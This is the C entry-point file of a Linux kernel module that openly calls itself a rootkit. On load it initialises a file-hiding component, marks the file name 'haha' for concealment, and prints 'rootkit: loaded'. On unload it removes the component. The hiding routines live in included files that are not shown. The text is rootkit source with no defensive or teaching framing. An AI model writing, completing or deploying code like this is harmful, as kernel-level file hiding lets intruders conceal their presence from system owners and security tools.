#include "Common.h"
#include "HiddenFile.h"

MODULE_LICENSE("GPL");

static int __init rootkit_init(void) {
    initHiddenFile();
    addHiddenFileName("haha");
    printk(KERN_INFO "rootkit: loaded\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    finiHiddenFile();
    printk(KERN_INFO "rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);